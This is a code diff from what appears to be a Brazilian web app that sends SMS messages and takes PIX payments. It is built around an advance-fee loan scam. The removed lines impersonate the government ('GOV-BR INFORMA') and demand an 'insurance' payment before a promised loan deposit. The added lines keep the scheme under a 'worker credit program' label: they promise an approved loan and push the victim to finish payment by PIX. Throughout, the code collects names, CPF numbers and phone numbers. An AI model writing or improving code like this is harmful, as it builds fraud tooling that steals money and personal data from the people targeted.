@@ -39,27 +39,12 @@ def send_verification_code_smsdev(phone_number: str, verification_code: str) -> 
             app.logger.error("SMSDEV_API_KEY not found in environment variables")
             return False, "API key not configured"
 
-        # Extract name and loan value from phone_number if available (format: "phone|name|loan_value")
-        parts = phone_number.split('|')
-        actual_phone = parts[0]
-        first_name = parts[1] if len(parts) > 1 else "Cliente"
-        loan_value = parts[2] if len(parts) > 2 else "10000"
-        
-        app.logger.info(f"SMSDEV: Using name={first_name}, loan_value={loan_value}")
-        
-        # Format the loan value correctly
-        try:
-            loan_value_float = float(loan_value)
-            loan_value_formatted = f"{loan_value_float:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
-        except:
-            loan_value_formatted = "10.000,00"
-
         # Format phone number (remove any non-digits)
-        formatted_phone = re.sub(r'\D', '', actual_phone)
+        formatted_phone = re.sub(r'\D', '', phone_number)
 
         if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
             # Message template
-            message = f"[GOV-BR INFORMA]: {first_name}, seu emprestimo no valor de R${loan_value_formatted} foi aprovado. Seu código de verificação é: {verification_code}."
+            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."
 
             # API parameters
             params = {
@@ -99,30 +84,15 @@ def send_verification_code_owen(phone_number: str, verification_code: str) -> tu
             app.logger.error("SMS_OWEN_TOKEN not found in environment variables")
             return False, "API token not configured"
 
-        # Extract name and loan value from phone_number if available (format: "phone|name|loan_value")
-        parts = phone_number.split('|')
-        actual_phone = parts[0]
-        first_name = parts[1] if len(parts) > 1 else "Cliente"
-        loan_value = parts[2] if len(parts) > 2 else "10000"
-        
-        app.logger.info(f"OWEN SMS: Using name={first_name}, loan_value={loan_value}")
-        
-        # Format the loan value correctly
-        try:
-            loan_value_float = float(loan_value)
-            loan_value_formatted = f"{loan_value_float:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
-        except:
-            loan_value_formatted = "10.000,00"
-        
-        # Format phone number (remove any non-digits)
-        formatted_phone = re.sub(r'\D', '', actual_phone)
-        
+        # Format phone number (remove any non-digits and add Brazil country code)
+        formatted_phone = re.sub(r'\D', '', phone_number)
+
         if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
             # Format as international number with Brazil code
             international_number = f"55{formatted_phone}"
-            
+
             # Message template
-            message = f"[GOV-BR INFORMA]: {first_name}, seu emprestimo no valor de R${loan_value_formatted} foi aprovado. Seu código de verificação é: {verification_code}."
+            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."
 
             # Prepare the curl command
             import subprocess
@@ -184,17 +154,11 @@ def send_verification_code(phone_number: str) -> tuple:
         # Generate random 4-digit code
         verification_code = ''.join(random.choices('0123456789', k=4))
 
-        # Get just the actual phone number if we have a format with name and loan value
-        actual_phone = phone_number
-        if '|' in phone_number:
-            parts = phone_number.split('|')
-            actual_phone = parts[0]
-            
         # Format phone number (remove any non-digits)
-        formatted_phone = re.sub(r'\D', '', actual_phone)
+        formatted_phone = re.sub(r'\D', '', phone_number)
 
         if len(formatted_phone) != 11:
-            app.logger.error(f"Invalid phone number format: {actual_phone}")
+            app.logger.error(f"Invalid phone number format: {phone_number}")
             return False, "Número de telefone inválido (deve conter DDD + 9 dígitos)"
 
         # Choose which API to use based on SMS_API_CHOICE
@@ -309,7 +273,7 @@ def send_sms_owen(phone_number: str, message: str) -> bool:
         app.logger.error(f"Error sending SMS via Owen SMS: {str(e)}")
         return False
 
-def send_sms(phone_number: str, full_name: str, amount: float, loan_value_str: str = None) -> bool:
+def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
     try:
         # Get first name
         first_name = full_name.split()[0]
@@ -321,17 +285,8 @@ def send_sms(phone_number: str, full_name: str, amount: float, loan_value_str: s
             app.logger.error(f"Invalid phone number format: {phone_number}")
             return False
 
-        # Parse loan_value from parameter or default to 10000
-        try:
-            loan_value = float(loan_value_str) if loan_value_str else 10000.0
-        except:
-            loan_value = 10000.0
-            
-        # Format the values correctly for Brazilian real
-        emprestimo_valor_formatado = f"{loan_value:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
-        seguro_valor_formatado = f"{amount:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
-            
-        message = f"TRANSFERENCIA PIX: um deposito no valor de R${emprestimo_valor_formatado} foi agendado para sua conta. Realize o pagamento do seguro no valor de R${seguro_valor_formatado} para receber a transferencia agora."
+        # Message template
+        message = f"[PROGRAMA CREDITO DO TRABALHADOR] {first_name}, seu empréstimo de R${amount:.2f} foi aprovado! Finalize o processo para receber via PIX instantaneamente."
 
         # Choose which API to use based on SMS_API_CHOICE
         if SMS_API_CHOICE.upper() == 'OWEN':
@@ -400,7 +355,6 @@ def payment():
         nome = request.args.get('nome')
         cpf = request.args.get('cpf')
         phone = request.args.get('phone')  # Get phone from query params
-        loan_value = request.args.get('loanValue')  # Obter valor do empréstimo
         source = request.args.get('source', 'index')
 
         if not nome or not cpf:
@@ -447,8 +401,7 @@ def payment():
 
         # Send SMS notification if we have a valid phone number
         if phone:
-            # Pass the loan_value too
-            send_sms(phone, nome, amount, loan_value)
+            send_sms(phone, nome, amount)
 
         # Obter QR code e PIX code da resposta da API
         qr_code = pix_data.get('pixQrCode') or pix_data.get('pix_qr_code')
@@ -631,22 +584,11 @@ def send_verification_code_route():
     try:
         data = request.json
         phone_number = data.get('phone')
-        name = data.get('name', '')
-        loan_value = data.get('loanValue', '10000')  # Valor do empréstimo selecionado
-        
-        # Append the name and loan value to the phone number for later use in the SMS message
-        if name:
-            first_name = name.split()[0] if name else "Cliente"
-            phone_with_name = f"{phone_number}|{first_name}|{loan_value}"
-            app.logger.info(f"[VERIFICATION] Composed phone with name and loan: {phone_with_name}")
-        else:
-            phone_with_name = phone_number
-            app.logger.info(f"[VERIFICATION] No name provided, using plain phone: {phone_with_name}")
 
         if not phone_number:
             return jsonify({'success': False, 'message': 'Número de telefone não fornecido'}), 400
 
-        success, result = send_verification_code(phone_with_name)
+        success, result = send_verification_code(phone_number)
 
         if success:
             # Store the verification code temporarily (in a real app, this should use Redis or similar)
